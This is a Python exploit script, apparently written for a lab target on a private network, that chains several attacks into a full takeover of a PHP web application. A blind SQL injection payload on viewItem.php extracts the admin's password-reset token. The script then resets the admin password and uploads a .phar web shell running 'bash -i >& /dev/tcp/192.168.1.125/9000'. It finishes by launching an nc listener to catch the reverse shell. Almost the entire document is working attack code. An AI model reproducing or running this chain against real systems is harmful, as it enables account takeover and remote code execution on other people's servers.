# SQL Injection at item/viewItem.php on line 18

# If the string is true, the request will return 404, if it's false it will return 302

import urllib3
import sys
import requests
import urllib
import time
import subprocess

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

url = 'http://192.168.1.123/item/viewItem.php?id='

def sendResetToken():

    print("[+] Reset password sent")
    # Sending password reset
    sendResetURL = 'http://192.168.1.123/login/resetPassword.php'

    d = {'username':'admin'}

    requests.post(sendResetURL, verify=False, proxies=proxies, data=d)

def injection(url):

    token = ""
    
    print("[+] Finding token...")

    # Loop through each position in the token (we known the length by checking generateToken())
    for i in range(1, 16):

        # Loop through ASCII values of printable characters (48 to 122) - https://theasciicode.com.ar/
        for j in range(48, 123):

            # Construct SQL injection payload
            # You have to compare the character in ascii decimal value
            payload = "4 AND (select ascii(substring(token,%s,1)) from user where id=1) = %s;" % (i, j)

            payload_encoded = urllib.parse.quote(payload)

            finalURL = url + payload_encoded

            # print(finalURL)
            
            r = requests.get(finalURL, verify=False, proxies=proxies, allow_redirects=False)
            
            # If response is 302, this is not the character
            if r.status_code == 302:
                sys.stdout.write('\r' + token + chr(j))
                sys.stdout.flush()
            else:
                token += chr(j)
                sys.stdout.write('\r' + token)
                sys.stdout.flush()
                break  # Move on to the next character in the token

    sys.stdout.write('\r')
    print("[+] Token found:", token)
    return token
        

def changePassword(token):

    changePassURL = 'http://192.168.1.123/login/doChangePassword.php'

    d = {'token':token, 'password':'admin321'}

    r = requests.post(changePassURL, verify=False, proxies=proxies, data=d)

    if "Success!" in r.text:
        print("[+] Password succesfully changed to admin321")
    else:
        print("[!] Something went wrong with password changing")
        exit()

def uploadReverseShell():

    session = requests.Session()

    loginURL = "http://192.168.1.123/login/checkLogin.php"

    # Logging in
    d = {'username':'admin', 'password':'admin321'}

    r = session.post(loginURL, verify=False, proxies=proxies, data=d)

    if "admin" in r.text:
        print("[+] Logged in as admin")
    else:
        print("[!] Something went wrong in login")
        exit()

    # Uploading reverse shell
    editItemURL = "http://192.168.1.123/item/updateItem.php"
    
    # Image with reverse shell
    shellFile = {
        'id':(None,"1"),
        'id_user':(None,"1"),
        'name':(None,"Raspery Pi 4"),
		'image':('shell.phar', "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.125/9000 0>&1'\");?>"),
		'description':(None,"Latest Raspberry Pi 4 Model B with 2/4/8GB RAM raspberry pi 4 BCM2711 Quad core Cortex-A72 ARM v8 1.5GHz Speeder Than Pi 3B"),
        'price':(None,"92")
	}

    r = session.post(editItemURL, verify=False, proxies=proxies, files=shellFile)

    if "Success!" in r.text:
        print("[+] Reverse shell uploaded")
    else:
        print("[!] Something went wrong with reverse shell upload")
        exit()

# First we send the reset to generate the token
sendResetToken()

# Then we get the token
token = injection(url)

# And so we use the token to change password and get the session cookie
changePassword(token)

uploadReverseShell()

print("[+] Getting reverse shell...")

subprocess.Popen(["nc","-nvlp","9000"])
time.sleep(1)

shellURL = "http://192.168.1.123/item/image/shell.phar"

requests.get(shellURL, verify=False, proxies=proxies, allow_redirects=False)